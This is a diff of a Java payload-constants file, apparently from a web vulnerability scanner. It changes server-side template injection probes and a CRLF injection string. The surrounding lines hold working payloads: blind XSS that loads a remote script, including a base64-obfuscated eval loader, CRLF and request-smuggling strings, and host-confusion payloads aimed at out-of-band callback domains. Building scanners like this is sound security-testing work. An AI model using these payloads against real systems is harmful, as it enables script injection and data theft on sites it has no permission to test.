@@ -48,10 +48,10 @@ public class PayloadConstants {
             new PayloadInfo("<link rel=\"stylesheet\" href=\"https://{fuzz}.lnk.tejq8.zcyy.fun/wlink.css\">", "<link>"),
             new PayloadInfo("\"><script src=\"https://js.rip/nm\"></script>", "bxss1"),
             new PayloadInfo("\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL25tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>", "bxss2"),
-            new PayloadInfo("{{9188*8}}", "SSTI1"),
-            new PayloadInfo("${9188*8}", "SSTI2"),
-            new PayloadInfo("#{9188*8}", "SSTI3"),
-            new PayloadInfo("[[${9188*8}]]", "SSTI4")
+            new PayloadInfo("{{9188*88}}", "SSTI1"),
+            new PayloadInfo("${9188*88}", "SSTI2"),
+            new PayloadInfo("#{9188*88}", "SSTI3"),
+            new PayloadInfo("[[${9188*88}]]", "SSTI4")
     );
 
     /**
@@ -141,7 +141,7 @@ public class PayloadConstants {
             new PayloadInfo("{path}@{fuzz}.tejq8.zcyy.fun", "{path}@host"),
             new PayloadInfo("{path}..", "{path}.."),
             new PayloadInfo("{path1}{path2}", "{path1}{path2}"),
-            new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20erfwx.tejq8.zcyy.fun%0D%0Ac9w:%204Content-Length:%2091866%0D%0Axsc:%20", "{path}CRLF"),
+            new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204Content-Length:%2091866%0D%0Axsc:%20", "{path}CRLF"),
             new PayloadInfo("{path}/%20HTTP/1.1%0D%0Axic:%20", "{path}%0D%0A"),
             new PayloadInfo("{path}/%20H", "ng crlf"),
             new PayloadInfo("{path}/%20HTTP/19.91%0D%0Ac9w:%20x%0D%0AOrigin:%20www.xixicrt.top", "ng crlf2"),
